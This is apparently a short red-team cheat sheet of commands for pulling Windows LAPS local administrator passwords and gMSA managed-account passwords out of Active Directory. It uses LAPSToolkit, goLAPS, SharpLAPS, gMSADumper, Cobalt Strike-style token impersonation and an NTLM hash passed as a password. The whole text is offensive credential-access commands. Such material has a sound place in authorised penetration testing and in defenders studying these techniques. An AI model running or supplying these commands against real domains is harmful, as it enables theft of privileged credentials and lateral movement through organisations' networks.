### Local Administrator Password Solution
```
PowerShell Get-Command *AdmPwd*
PowerShell Get-AdmPwdPassword -ComputerName Alice_PC | fl

```
```
powershell-import C:\Users\Commando\Desktop\LAPSToolkit.ps1
powerpick Get-LAPSComputers
powershell Find-LAPSDelegatedGroups
make_token MeMe 123456qWE
make_token insomnia.io\MeMe 123456qWE
```
### goLAPS
```
golaps-v0.1.1-windows-amd64.exe -D <IP|FQDN> -u john -d activebreach.io -p 123456 
```
### SharpLAPS

```
SharpLAPS.exe /user:DOMAIN\User /pass:MyP@ssw0rd123! /host:192.168.1.1
```

### gMSA
```
Get-ADServiceAccount -Identity GMSAccount -Properties PrincipalsAllowedToRetrieveManagedPassword
Get-ADServiceAccount -Filter * -Properties * | Select SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval,ServicePrincipalNames

python3 gMSADumper.py -u user -p password -d domain.local
python gMSADumper.py -k -d domain.local -l dc01.domain.loca #Kerberos Authentication
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```
